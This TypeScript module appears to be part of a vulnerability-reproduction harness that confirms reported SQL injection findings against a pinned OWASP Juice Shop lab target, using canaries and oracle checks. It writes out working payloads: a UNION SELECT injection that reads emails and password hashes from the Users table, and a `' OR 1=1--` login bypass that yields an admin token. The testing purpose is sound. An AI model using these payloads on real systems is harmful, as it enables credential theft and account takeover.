import type {
  GetRecipesForTargetFn,
  ReproductionProbeResult,
  ReproductionRecipe,
  ReproductionRequest,
} from "@/lib/reproduction/types";

/**
 * Reproduction scenarios from docs/decisions.md Q18, against the one pinned Juice Shop target.
 * Recipes are code because `oracleCheck` cannot live in a jsonb column (see the type doc in
 * lib/reproduction/types.ts). Only the target-specific values -- base URL, search path, canary
 * registration path -- come from the bound TargetProfile's `config`; the frozen scenario inputs
 * (exploit payloads, fixture password, expected status codes) are constants in this module,
 * matching the spec Q18 froze rather than anything a report or agent could supply.
 */

/** Substituted by the orchestrator with a fresh, unpredictable value before the request is
 * sent. Every request in a recipe run shares the one canary. */
const CANARY_PLACEHOLDER = "{{canary}}";

/**
 * Juice Shop enforces no password strength rule at all (models/user.ts has no length or
 * complexity validator, only a hash-on-write setter), so any non-empty string registers
 * cleanly. Fixed rather than random purely for readable fixture logs.
 */
const FIXTURE_PASSWORD = "bd-fixture-Only1!";

type JuiceShopConfig = {
  baseUrl: string;
  searchPath: string;
  canaryRegistrationPath: string;
};

/**
 * `target.config` is `unknown` at the type level (a jsonb column in practice), so narrow it
 * before reading anything out of it rather than casting. `baseUrl` is validated for
 * completeness even though it plays no part in the paths below -- the orchestrator resolves
 * these relative paths against the target's own base URL, not the recipe.
 */
function isJuiceShopConfig(config: unknown): config is JuiceShopConfig {
  if (typeof config !== "object" || config === null) return false;
  const c = config as Record<string, unknown>;
  return (
    typeof c.baseUrl === "string" &&
    typeof c.searchPath === "string" &&
    typeof c.canaryRegistrationPath === "string"
  );
}

/**
 * Registers a fresh user through Juice Shop's public registration endpoint. This is the
 * trusted fixture: the canary email lands in the Users table the UNION payload reads from, with
 * no direct database access and no image modification -- see decisions.md Q18, "How the canary
 * gets seeded."
 *
 * Body shape verified against the pinned v17.3.0 source, not guessed: models/user.ts declares
 * only `email` and `password` (no `passwordRepeat`, `securityQuestion` or `securityAnswer`
 * field on the User model), and server.ts's pre-finale handler for `POST /api/Users` only acts
 * on `passwordRepeat` when it is present -- omitting it, or including it, both register
 * successfully. `passwordRepeat` is included anyway because it is what the real registration
 * form sends and costs nothing to match.
 */
function registrationFixture(config: JuiceShopConfig): { request: ReproductionRequest } {
  return {
    request: {
      method: "POST",
      path: config.canaryRegistrationPath,
      body: {
        email: CANARY_PLACEHOLDER,
        password: FIXTURE_PASSWORD,
        passwordRepeat: FIXTURE_PASSWORD,
      },
    },
  };
}

/** Frozen in decisions.md Q18: 9 columns, email in position 2, password in position 3. */
const SQLI_SEARCH_PAYLOAD =
  "qwert')) UNION SELECT id,email,password,'4','5','6','7','8','9' FROM Users--";

/**
 * The search route runs `SELECT * FROM Products WHERE ...` (routes/search.ts), so a compound
 * UNION result takes its column names from Products, not from Users: id, name, description,
 * price, deluxePrice, image, createdAt, updatedAt, deletedAt (models/product.ts, plus
 * Sequelize's default timestamps and the paranoid `deletedAt`). Position 2 of the UNION is
 * therefore returned to the client under the key "name", holding the injected email -- never a
 * field literally called "email". Checking "name" specifically (rather than a raw substring
 * search over the whole body, which is what Juice Shop's own internal challenge tracker does)
 * is what keeps a canary that coincidentally appears elsewhere in the payload from counting.
 */
function canaryInSearchResponse(body: string, canary: string): boolean {
  let parsed: unknown;
  try {
    parsed = JSON.parse(body);
  } catch {
    return false;
  }
  if (typeof parsed !== "object" || parsed === null) return false;
  const rows = (parsed as { data?: unknown }).data;
  if (!Array.isArray(rows)) return false;
  return rows.some((row) => {
    if (typeof row !== "object" || row === null) return false;
    const name = (row as Record<string, unknown>).name;
    return typeof name === "string" && name.includes(canary);
  });
}

function sqliSearchRecipe(config: JuiceShopConfig): ReproductionRecipe {
  return {
    id: "juice-shop-sqli-search",
    title: "Reflected UNION SQL injection in product search",
    keywords: [
      "sql injection",
      "sqli",
      "union select",
      "product search",
      "search endpoint",
      config.searchPath,
    ],
    fixture: registrationFixture(config),
    negativeControl: {
      method: "GET",
      path: `${config.searchPath}?q=apple`,
    },
    exploit: {
      method: "GET",
      path: `${config.searchPath}?q=${encodeURIComponent(SQLI_SEARCH_PAYLOAD)}`,
    },
    oracleCheck: (response, canary) =>
      response.status === 200 && canaryInSearchResponse(response.body, canary),
  };
}

/** Frozen in decisions.md Q18: `POST /rest/user/login` for the exploit and its negative
 * control, `GET /api/Users` for the follow-up that proves the minted token grants access. Not
 * config, unlike `searchPath`: Juice Shop's own routing fixes both, so nothing about them varies
 * across a rebuild of the same pinned target. */
const LOGIN_PATH = "/rest/user/login";
const USERS_PATH = "/api/Users";

/**
 * Frozen in decisions.md Q18: a classic always-true WHERE clause, closing out the query with a
 * comment so nothing after it (the password check) still applies. It matches the first row in
 * the Users table -- id 1, the seeded admin account -- regardless of what password is sent.
 */
const LOGIN_BYPASS_EMAIL = "' OR 1=1--";

/**
 * routes/login.ts replies with `{ authentication: { token, bid, umail } }` on a successful
 * login (the JWT security.authorize(user) mints) and something else entirely -- no
 * `authentication` object -- on a 401. Returns undefined for anything that isn't a well-formed
 * token, which is exactly the signal both call sites below need: "was there a token to chase at
 * all."
 */
function extractAuthToken(response: ReproductionProbeResult): string | undefined {
  let parsed: unknown;
  try {
    parsed = JSON.parse(response.body);
  } catch {
    return undefined;
  }
  if (typeof parsed !== "object" || parsed === null) return undefined;
  const authentication = (parsed as Record<string, unknown>).authentication;
  if (typeof authentication !== "object" || authentication === null) return undefined;
  const token = (authentication as Record<string, unknown>).token;
  return typeof token === "string" && token.length > 0 ? token : undefined;
}

/**
 * Builds the exploit's follow-up: the minted token, presented the way Juice Shop's own
 * `express-jwt`-backed `security.isAuthorized()` middleware expects it -- `utils.jwtFrom(req)`
 * reads a standard `Authorization: Bearer <token>` header (lib/insecurity.ts). Returns undefined
 * when the exploit response minted nothing, e.g. the injection didn't work this run: that is a
 * complete exploit leg with no proof, not a request worth sending.
 */
function buildUsersFollowUpRequest(exploitResponse: ReproductionProbeResult): ReproductionRequest | undefined {
  const token = extractAuthToken(exploitResponse);
  if (!token) return undefined;
  return {
    method: "GET",
    path: USERS_PATH,
    headers: { Authorization: `Bearer ${token}` },
  };
}

/**
 * `GET /api/Users` is the finale-backed admin listing (server.ts's `autoModels`, User excluding
 * only `password` and `totpSecret`), wrapped by the same `{ status, data: [...] }` shape as
 * every other finale route. Unlike the search recipe's UNION result -- where the query's own
 * column order remaps the injected email to a field literally called "name" -- this listing
 * returns the real `email` column verbatim, so the canary lands under its own name here.
 */
function canaryInUsersResponse(body: string, canary: string): boolean {
  let parsed: unknown;
  try {
    parsed = JSON.parse(body);
  } catch {
    return false;
  }
  if (typeof parsed !== "object" || parsed === null) return false;
  const rows = (parsed as { data?: unknown }).data;
  if (!Array.isArray(rows)) return false;
  return rows.some((row) => {
    if (typeof row !== "object" || row === null) return false;
    const email = (row as Record<string, unknown>).email;
    return typeof email === "string" && email.includes(canary);
  });
}

function loginBypassRecipe(config: JuiceShopConfig): ReproductionRecipe {
  return {
    id: "juice-shop-login-bypass",
    title: "Authentication bypass via SQL injection in login",
    keywords: ["sql injection", "sqli", "auth bypass", "authentication bypass", "login bypass", LOGIN_PATH],
    fixture: registrationFixture(config),
    // The negative control is the same login with the canary's own email but a wrong password,
    // which Juice Shop correctly rejects with 401 -- a legitimate, complete answer, not an
    // infrastructure failure, hence negativeControlAcceptedStatuses below.
    negativeControl: {
      method: "POST",
      path: LOGIN_PATH,
      body: { email: CANARY_PLACEHOLDER, password: "definitely-the-wrong-password" },
    },
    negativeControlAcceptedStatuses: [401],
    exploit: {
      method: "POST",
      path: LOGIN_PATH,
      body: { email: LOGIN_BYPASS_EMAIL, password: "x" },
    },
    // Used for the negative control (expect no token from a rejected login). The exploit leg is
    // decided by exploitFollowUp below instead: a minted token alone proves nothing, since any
    // successful login -- injected or not -- would mint one.
    oracleCheck: (response) => extractAuthToken(response) !== undefined,
    exploitFollowUp: {
      buildRequest: buildUsersFollowUpRequest,
      oracleCheck: (response, canary) => canaryInUsersResponse(response.body, canary),
    },
  };
}

export const getRecipesForTarget: GetRecipesForTargetFn = (target) => {
  if (target.name !== "juice-shop-v17.3.0") return [];
  if (!isJuiceShopConfig(target.config)) return [];
  return [sqliSearchRecipe(target.config), loginBypassRecipe(target.config)];
};
